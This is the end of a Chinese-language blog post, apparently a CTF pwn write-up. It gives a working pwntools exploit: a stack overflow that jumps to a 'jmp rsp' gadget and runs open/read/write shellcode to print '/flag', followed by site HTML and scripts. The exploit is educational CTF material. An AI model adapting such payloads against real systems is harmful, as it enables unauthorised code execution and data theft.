<p>payloadï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">jmp_rsp</span> <span class="o">=</span> <span class="mh">0x400a01</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">mmap</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">))</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rax, 0x123000; jmp rax&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">jmp_rsp</span><span class="p">)</span> <span class="o">+</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;sub rsp, 0x30; jmp rsp&#34;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘åœ¨æ±‡ç¼–ä»£ç åˆ†æçš„è¿‡ç¨‹ä¸­æ‰¾åˆ°å…³é”®çš„ jmp_rsp åé—¨åœ°å€ï¼Œå¯ä»¥è°ƒç”¨è¿™è¡Œæ±‡ç¼–ä»£ç æ¥å®ç°è·³è½¬å›èµ·å§‹åœ°å€ï¼š</p>
<p><img src="/p/2025bjtuctf-pwn/39.png"
	width="855"
	height="250"
	srcset="/p/2025bjtuctf-pwn/39_hu_403cb45c1e965622.png 480w, /p/2025bjtuctf-pwn/39_hu_d3a7b58676d2aed0.png 1024w"
	loading="lazy"
	
		alt="åé—¨jmp_rsp = 0x400a01"
	
	
		class="gallery-image" 
		data-flex-grow="342"
		data-flex-basis="820px"
	
></p>
<p>ayload = asm (shellcraft.read (0, mmap, 0x100)) çš„æ„æ€æ˜¯å¯åŠ¨ read å‡½æ•°ï¼Œå¼€å¯ â€œè¯»å–æ¨¡å¼â€ å¤„äºå¾…è¯»å–çŠ¶æ€ï¼Œç­‰å¾…åé¢çš„ orw_shellcode çš„å‡ºç°ï¼Œå¹¶å­˜åˆ° mmap çš„å¯è¯»å¯å†™åŒºåŸŸï¼ˆ2+4ï¼‰ï¼›</p>
<blockquote>
<p>æœ€æ­£ç¡®ç†è§£ï¼šæ‰§è¡Œåå› ç¼ºå°‘è¾“å…¥æ•°æ®ï¼ˆorw_shellcodeï¼‰æ‰è¿›å…¥ â€œç­‰å¾…çŠ¶æ€â€ã€‚</p>
</blockquote>
<p>asm (â€œmov rax, 0x123000; jmp raxâ€) çš„æ„æ€æ˜¯è·³åˆ° mmap=0x123000 åŒºåŸŸï¼Œä¹Ÿå°±æ˜¯æŒ‡å‘è¿™ä¸ªåŒºåŸŸï¼Œç­‰å¾…åç»­ orw_shellcode æ³¨å…¥æ‰§è¡Œã€‚</p>
<p>payload = asm (shellcraft.read (0, mmap, 0x100)) + asm (â€œmov rax, 0x123000; jmp raxâ€) åŠ èµ·æ¥ä¸è¶³ 0x28 ä¸ªå­—èŠ‚ï¼ˆ0x20+8ï¼‰ï¼Œè®© buf åˆšå¥½å……æ»¡ï¼Œä»¥ä¾¿åç»­<strong>å°† <code>rsp</code> è°ƒæ•´åˆ° <code>buf</code> ç¼“å†²åŒºèµ·å§‹åœ°å€</strong>ï¼ˆbuf å¤åŸï¼‰ã€‚</p>
<p>python3 çš„ expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s2">&#34;amd64&#34;</span><span class="p">,</span><span class="n">os</span><span class="o">=</span><span class="s2">&#34;linux&#34;</span><span class="p">,</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&#34;debug&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = remote(&#39;ip&#39; , port)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">mmap</span> <span class="o">=</span> <span class="mh">0x123000</span>
</span></span><span class="line"><span class="cl"><span class="n">jmp_rsp</span> <span class="o">=</span> <span class="mh">0x400a01</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">mmap</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">))</span> <span class="o">+</span> <span class="n">asm</span><span class="p">(</span><span class="s2">&#34;mov rax, 0x123000; jmp rax&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x28</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">jmp_rsp</span><span class="p">)</span> <span class="o">+</span><span class="n">asm</span><span class="p">(</span><span class="s2">&#34;sub rsp, 0x30; jmp rsp&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">orw_shellcode</span> <span class="o">=</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="n">mmap</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcraft</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">mmap</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">orw_shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;do&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ç»“å°¾">ç»“å°¾
</h2><p>æœ‰ç–‘é—®è§£å†³ä¸äº†ï¼Œå¯ä»¥åœ¨ä¸‹æ–¹è¯„è®ºåŒºç›¸äº’äº¤æµï¼Œä½œè€…ä¸€ç›´éƒ½åœ¨&hellip;.</p>

</section>


    <footer class="article-footer">
    

    <section class="article-lastmod">
        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
  <path stroke="none" d="M0 0h24v24H0z"/>
  <circle cx="12" cy="12" r="9" />
  <polyline points="12 7 12 12 15 15" />
</svg>



        <span>
            æœ€åæ›´æ–°äº 2025-11-07
        </span>
    </section></footer>


    
        <link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.css"integrity="sha384-n8MVd4RsNIU0tAv4ct0nTaAbDJwPJzDEaqSD1odI&#43;WdtXRGWt2kTvGFasHpSy3SV"crossorigin="anonymous"
            ><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/katex.min.js"integrity="sha384-XjKyOOlGwcjNTAIQHIpgOno0Hl1YQqzUOEleOLALmuqehneUG&#43;vnGctmUb0ZY0l8"crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/katex@0.16.9/dist/contrib/auto-render.min.js"integrity="sha384-&#43;VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4&#43;/RRE05"crossorigin="anonymous"
                defer
                >
            </script><script>
    window.addEventListener("DOMContentLoaded", () => {
	const mainArticleElement = document.querySelector(".main-article");
        renderMathInElement(mainArticleElement, {
            delimiters: [
                { left: "$$", right: "$$", display: true },
                { left: "$", right: "$", display: false },
                { left: "\\(", right: "\\)", display: false },
                { left: "\\[", right: "\\]", display: true }
            ],
            ignoredClasses: ["gist"]
        });})
</script>

    
</article>

    

    

<aside class="related-content--wrapper">
    <h2 class="section-title">ç›¸å…³æ–‡ç« </h2>
    <div class="related-content">
        <div class="flex article-list--tile">
            
                
<article class="has-image">
    <a href="/p/%E7%BB%99pwn%E6%96%B0%E6%89%8B%E7%9A%84%E6%BA%A2%E5%87%BA%E9%AD%94%E6%B3%95%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/">
        
        
            <div class="article-image">
                <img src="/p/%E7%BB%99pwn%E6%96%B0%E6%89%8B%E7%9A%84%E6%BA%A2%E5%87%BA%E9%AD%94%E6%B3%95%E5%85%A5%E9%97%A8%E6%89%8B%E5%86%8C/PWN%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97.ee96c3422d2fcb13da9514744e2762a2_hu_179631d5777f326f.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post ç»™PWNæ–°æ‰‹çš„æº¢å‡ºé­”æ³•å…¥é—¨æ‰‹å†Œ"
                        
                        data-hash="md5-7pbDQi0vyxPalRR0Tidiog==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">ç»™PWNæ–°æ‰‹çš„æº¢å‡ºé­”æ³•å…¥é—¨æ‰‹å†Œ</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pwn-4/">
        
        
            <div class="article-image">
                <img src="/p/pwn-4/PWN4.3657bbeb84fdb7f3290e78d3c41b8d4c_hu_d9ba59500c5360b4.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-4"
                        
                        data-hash="md5-Nle764T9t/MpDnjTxBuNTA==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-4</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pwn-3/">
        
        
            <div class="article-image">
                <img src="/p/pwn-3/PWN3.4afa5f5bde601dbc35b64aebcb8c25e3_hu_a61ad70f238c03c4.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-3"
                        
                        data-hash="md5-SvpfW95gHbw1tkrry4wl4w==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-3</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/">
        
        
            <div class="article-image">
                <img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/ctfshow.8c2a966268b078c807772be02e985309_hu_9b3814b0af84762b.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post CTFshow-å…¥é—¨PWN-writeup"
                        
                        data-hash="md5-jCqWYmiweMgHdyvgLphTCQ==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">CTFshow-å…¥é—¨PWN-writeup</h2>
        </div>
    </a>
</article>

            
                
<article class="has-image">
    <a href="/p/pwn-2/">
        
        
            <div class="article-image">
                <img src="/p/pwn-2/PWN2.ec0b8de7542727a390b799ae24c64af8_hu_ed10e985448522e2.png" 
                        width="250" 
                        height="150" 
                        loading="lazy"
                        alt="Featured image of post PWN-2"
                        
                        data-hash="md5-7AuN51QnJ6OQt5muJMZK&#43;A==">
                
            </div>
        

        <div class="article-details">
            <h2 class="article-title">PWN-2</h2>
        </div>
    </a>
</article>

            
        </div>
    </div>
</aside>

     
    
        
    <script
    src="https://giscus.app/client.js"
    data-repo="Expl0rer-Ct/Expl0rer.Ct-s-Blog"
    data-repo-id="R_kgDOPd0X7g"
    data-category="Announcements"
    data-category-id="DIC_kwDOPd0X7s4CuMr6"
    data-mapping="pathname"
    data-strict="0"
    data-reactions-enabled="1"
    data-emit-metadata="0"
    data-input-position="top"
    data-theme="light"
    data-lang="en"
    data-loading=""
    crossorigin="anonymous"
    async
></script>
<script>
    function setGiscusTheme(theme) {
        let giscus = document.querySelector("iframe.giscus-frame");
        if (giscus) {
            giscus.contentWindow.postMessage(
                {
                    giscus: {
                        setConfig: {
                            theme: theme,
                        },
                    },
                },
                "https://giscus.app"
            );
        }
    }

    (function () {
        addEventListener("message", (e) => {
            if (event.origin !== "https://giscus.app") return;
            handler();
        });
        window.addEventListener("onColorSchemeChange", handler);

        function handler() {
            if (document.documentElement.dataset.scheme === "light") {
                setGiscusTheme('light');
            } else {
                setGiscusTheme('dark');
            }
        }
    })();
</script>

    

    
<script defer src="https://events.vercount.one/js"></script>
<footer class="site-footer">
    <section class="copyright">
        &copy; 
        
        2025 Expl0rer.Ct
    </section>
    
    <section class="powerby">
        



        

















































        
<section class="wordcount">
  <div class="wordcount-row">
    <p>åšä¸»å‘å¸ƒäº†19ç¯‡æ–‡ç«   ||</p>
    <p>æ€»å…±252.62k å­—</p>
  </div>
</section>
        
  


<a>æ€»è®¿å®¢æ•°: </a><span id='busuanzi_value_site_uv'>åˆ«æ€¥åœ¨åŠ è½½ä¸­äº†...</span> <a> | </a> <a>æ€»è®¿é—®é‡: </a><span id='busuanzi_value_site_pv'>åŠ è½½ä¸­...</span></br>



<div class="site-uptime-container">
  <span id="timeDate" class="site-uptime-text">è½½å…¥å¤©æ•°...</span>
  <span id="times" class="site-uptime-text">è½½å…¥æ—¶åˆ†ç§’...</span>
</div>

<script language="javascript"> 
    var now = new Date();
    function createtime(){
        now.setTime(now.getTime()+250); 
        var grt= new Date("2025/08/01 00:00:00"); 
        days = (now - grt ) / 1000 / 60 / 60 / 24;
        dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
        hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;}
        minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes);
        if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds);
        if(String(snum).length ==1 ){snum = "0" + snum;}

        document.getElementById("timeDate").innerHTML = "æœ¬ç«™å·²ç¨³å®šè¿è¡Œ"+dnum+" å¤© ";document.getElementById("times").innerHTML = hnum + " å°æ—¶ " + mnum + " åˆ† " + snum + " ç§’"
    }
    setInterval("createtime()",250); 
</script> 

<script>
    (function(u, c) {
      var d = document, t = 'script', o = d.createElement(t),
          s = d.getElementsByTagName(t)[0];
      o.src = u;
      if (c) { o.addEventListener('load', function(e) { c(e); }); }
      s.parentNode.insertBefore(o, s);
    })('//cdn.bootcss.com/pangu/4.0.7/pangu.min.js', function() {
      pangu.spacingPage();
    });
</script>


    
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">

    
    <div class="pswp__bg"></div>

    
    <div class="pswp__scroll-wrap">

        
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>

        
        <div class="pswp__ui pswp__ui--hidden">

            <div class="pswp__top-bar">

                

                <div class="pswp__counter"></div>

                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>

                <button class="pswp__button pswp__button--share" title="Share"></button>

                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>

                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>

                
                
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                        <div class="pswp__preloader__cut">
                            <div class="pswp__preloader__donut"></div>
                        </div>
                    </div>
                </div>
            </div>

            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
                <div class="pswp__share-tooltip"></div>
            </div>

            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
            </button>

            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
            </button>

            <div class="pswp__caption">
                <div class="pswp__caption__center"></div>
            </div>

        </div>

    </div>

</div><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
                defer
                >
            </script><script 
                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
                defer
                >
            </script><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
            ><link 
                rel="stylesheet" 
                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
            >

            </main>
        </div>
        <script 
                src="https://cdnjs.cloudflare.com/ajax/libs/node-vibrant/3.1.6/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
                
                >
            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script><script type="text/javascript" src="/ts/custom.89d9bb2c3c071ae8a261f67661c22b84ef67ba7b7a885dabd2bbd9ebef84ed40.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>


<head>
  
  <link rel="preconnect" href="https://fonts.font.im" crossorigin>
  <link 
    href="https://fonts.font.im/css?family=PT+Sans" 
    rel="stylesheet"
    media="print" 
    onload="this.media='all'"
    id="font-cn"
  >
  
  
  <link 
    href="https://fonts.googleapis.com/css2?family=PT+Sans" 
    rel="stylesheet"
    media="print" 
    onload="this.media='all'"
    id="font-en"
    disabled
  >
  
  <script>
    
    document.querySelector('#font-cn').addEventListener('load', function() {
      document.querySelector('#font-en').disabled = true;
    }).addEventListener('error', function() {
      document.querySelector('#font-en').disabled = false;
      document.querySelector('#font-en').media = 'all';
    });
  </script>
  
  <noscript>
    <link 
      href="https://fonts.font.im/css?family=PT+Sans" 
      rel="stylesheet"
    >
  </noscript>
</head>

<style>
    #TableOfContents > ul ul,
    #TableOfContents > ul ol,
    #TableOfContents > ol ul,
    #TableOfContents > ol ol {
        display: none;
    }
    #TableOfContents > ul .open,
    #TableOfContents > ol .open {
        display: block;
    }
</style>

<script>
    function initTocHide() {
        let toc = document.querySelector(".widget--toc");
        if (!toc) {
            return;
        }
        window.addEventListener('scroll', function() {
            let openUl = document.querySelectorAll(".open");
            if (openUl.length > 0) {
              openUl.forEach((ul) => {
                ul.classList.remove("open")
              })
            }
            let currentLi = document.querySelector(".active-class");
            if (!currentLi) {
                return
            }
            if (currentLi.children.length > 1) {
                currentLi.children[1].classList.add("open")
            }
            let ul = currentLi.parentElement;
            do {
                ul.classList.add("open");
                const parent = ul.parentElement;
                ul = parent ? parent.parentElement : null;
            } while (ul && (ul.localName === 'ul' || ul.localName === 'ol'))
        });
    }
    initTocHide()
</script>


<style>
    #backTopBtn {
        display: none;
        position: fixed;
        bottom: 30px;
        z-index: 99;
        cursor: pointer;
        width: 30px;
        height: 30px;
        background-image: url(https://expl0rer.top/icons/backTop.svg);
    }
</style>

<script>
    function initScrollTop() {
        let rightSideBar = document.querySelector(".right-sidebar");
        if (!rightSideBar) {
            return;
        }
        let btn = document.createElement("div");
        btn.id = "backTopBtn";
        btn.onclick = backToTop
        rightSideBar.appendChild(btn)
        window.addEventListener('scroll', function() {
            if (document.body.scrollTop > 20 || document.documentElement.scrollTop > 20) {
                btn.style.display = "block";
            } else {
                btn.style.display = "none";
            }
        });
    }

    function backToTop(){
        window.scrollTo({ top: 0, behavior: "smooth" })
    }

    initScrollTop();
</script>


<style>
    .highlight {
        max-height: 400px;
        overflow: hidden;
    }

    .code-show {
        max-height: none !important;
    }

    .code-more-box {
        width: 100%;
        padding-top: 78px;
        background-image: -webkit-gradient(linear, left top, left bottom, from(rgba(255, 255, 255, 0)), to(#fff));
        position: absolute;
        left: 0;
        right: 0;
        bottom: 0;
        z-index: 1;
    }

    .code-more-btn {
        display: block;
        margin: auto;
        width: 44px;
        height: 22px;
        background: #f0f0f5;
        border-top-left-radius: 8px;
        border-top-right-radius: 8px;
        padding-top: 6px;
        cursor: pointer;
    }

    .code-more-img {
        cursor: pointer !important;
        display: block;
        margin: auto;
        width: 22px;
        height: 16px;
    }
</style>

<script>
  function initCodeMoreBox() {
    let codeBlocks = document.querySelectorAll(".highlight");
    if (!codeBlocks) {
      return;
    }
    codeBlocks.forEach(codeBlock => {
      if (codeBlock.scrollHeight <= codeBlock.clientHeight) {
        return;
      }
      let codeMoreBox = document.createElement('div');
      codeMoreBox.classList.add('code-more-box');
      let codeMoreBtn = document.createElement('span');
      codeMoreBtn.classList.add('code-more-btn');
      codeMoreBtn.addEventListener('click', () => {
        codeBlock.classList.add('code-show');
        codeMoreBox.style.display = 'none';
        window.dispatchEvent(new Event('resize'))
      })
      let img = document.createElement('img');
      img.classList.add('code-more-img');
      img.src = "https:\/\/expl0rer.top\/icons\/codeMore.png"
      codeMoreBtn.appendChild(img);
      codeMoreBox.appendChild(codeMoreBtn);
      codeBlock.appendChild(codeMoreBox)
    })
  }
  
  initCodeMoreBox();
</script>






<script>
    function showHideView() {
        let viewCounts = document.querySelectorAll("#viewCount");
        if (viewCounts) {
            let article =  document.querySelector(".article-page");
            if (!article) {
                viewCounts.forEach(ele => {
                    ele.style.display = 'none';
                });
            }
        }
    }
    
    showHideView();
</script>

<script src="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.js" crossorigin="anonymous"></script>
<link rel="stylesheet" href="https://npm.elemecdn.com/nprogress@0.2.0/nprogress.css" crossorigin="anonymous" />
<script>
    NProgress.start();
    document.addEventListener("readystatechange", () => {
        if (document.readyState === "interactive") NProgress.inc(0.8);
        if (document.readyState === "complete") NProgress.done();
    });
</script>


<script>
    var pjax = new pjax({
        selectors: [
            ".main-container"
        ]
    })

</script>

<script>
    pjax._handleResponse = pjax.handleResponse;
    pjax.handleResponse = function(responseText, request, href, options) {
        if (request.responseText.match("<html")) {
            if (responseText) {
                let newDom = new DOMParser().parseFromString(responseText, 'text/html');
                let bodyClass = newDom.body.className;
                document.body.setAttribute("class", bodyClass)
            }
            pjax._handleResponse(responseText, request, href, options);
        } else {
        }
    }
</script>



<script>
    document.addEventListener('pjax:complete', () => {
        if (window.Stack && typeof window.Stack.init === 'function') {
            window.Stack.init();
        }
    })
</script>

<div id="particles-js"></div>

<script src="https://expl0rer.top/background/particles.min.js"></script>
<script>
  particlesJS.load('particles-js', "https:\/\/expl0rer.top\/background\/particlesjs-config.json", function() {
    console.log('particles.js loaded - callback');
  });
</script>

<style>
  #particles-js {
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    z-index: -1;
  }
</style>


<script src="https://expl0rer.top/background/sakura.js"></script>

    </body>
</html>
